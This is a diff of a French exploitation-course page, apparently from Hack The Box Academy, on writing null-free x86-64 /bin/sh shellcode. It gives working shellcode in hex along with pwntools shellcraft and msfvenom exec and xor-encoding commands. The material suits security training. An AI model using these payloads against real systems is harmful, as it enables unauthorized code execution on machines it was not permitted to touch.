@@ -8,7 +8,9 @@
 
 ### <mark style="color:blue;">🐚 Shellcode</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`/bin/sh`</mark>
 
-Avant de continuer avec les outils et ressources en ligne, essayons de **construire notre propre shellcode `/bin/sh`**. Pour cela, nous pouvons utiliser l’appel système `execve` avec le **numéro de syscall 59**, qui nous permet d’exécuter une application système :
+Avant de continuer avec les outils et ressources en ligne, essayons de **construire notre propre shellcode `/bin/sh`**.&#x20;
+
+Pour cela, nous pouvons utiliser l’appel système `execve` avec le **numéro de syscall 59**, qui nous permet d’exécuter une application système :
 
 ```bash
 mrroboteLiot_1@htb[/htb]$ man -s 2 execve
@@ -54,11 +56,35 @@ _start:
 
 On remarque que ce code **contient des octets NULL**, donc il **ne produira pas un shellcode fonctionnel**.
 
+```
+Stack (mémoire):
+                     
+0x7fffffffdfe0: │ 0x7fffffffdff0 │ ← rsi pointe ici (argv[0])
+                ├────────────────┤
+0x7fffffffdfe8: │ 0x0000000000 │   (argv[1] = NULL)
+                ├────────────────┤
+0x7fffffffdff0: │ '/bin//sh'     │ ← rdi pointe ici (pathname)
+                ├────────────────┤
+0x7fffffffdff8: │ 0x0000000000 │   (NULL terminator de string)
+                └────────────────┘
+
+VUE CONCEPTUELLE
+================
+
+execve(pathname, argv[], envp[])
+         │        │       │
+         │        │       └─→ rdx = NULL
+         │        │
+         │        └─→ rsi → [ptr1, NULL]
+         │                    │
+         │                    └─→ ptr1 → "/bin//sh"
+         │
+         └─→ rdi → "/bin//sh"
+```
+
 ***
 
 #### <mark style="color:green;">✅ Objectif : retirer les NULLs</mark>
-
-Essayez de **retirer tous les octets NULL** du code assembleur ci-dessus pour produire un **shellcode fonctionnel**.
 
 We can zero-out `rdx` with `xor`, and then push it for string terminators instead of pushing `0`:Code: nasm
 
@@ -76,18 +102,14 @@ _start:
     syscall
 ```
 
-Une fois corrigé, exécutez **shellcoder.py** dessus pour obtenir un shellcode **sans NULL** :
-
 ```bash
-mrroboteLiot_1@htb[/htb]$ python3 shellcoder.py sh
+python3 shellcoder.py sh
 ```
 
 ```
 b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
 27 octets - Aucun octet NULL
 ```
-
-Essayez d’exécuter ce shellcode avec `loader.py` pour vérifier s’il fonctionne et nous donne un shell. Passons maintenant à la génération de shellcodes via des outils.
 
 ***
 
@@ -96,7 +118,7 @@ Essayez d’exécuter ce shellcode avec `loader.py` pour vérifier s’il foncti
 Commençons avec **pwntools** et sa bibliothèque `shellcraft`, qui permet de **générer du shellcode pour divers appels systèmes**. Pour lister les syscalls disponibles :
 
 ```bash
-mrroboteLiot_1@htb[/htb]$ pwn shellcraft -l 'amd64.linux'
+ pwn shellcraft -l 'amd64.linux'
 ```
 
 ```
@@ -161,9 +183,11 @@ msfvenom -l payloads | grep 'linux/x64'
 
 Exécuter un shell via `/bin/sh` :
 
+{% code fullWidth="true" %}
 ```bash
 msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'
 ```
+{% endcode %}
 
 ```
 Payload size: 48 bytes
@@ -193,9 +217,11 @@ msfvenom -l encoders
 
 Encoder avec `x64/xor` :
 
+{% code fullWidth="true" %}
 ```bash
 msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'
 ```
+{% endcode %}
 
 ```
 Payload size: 87 bytes
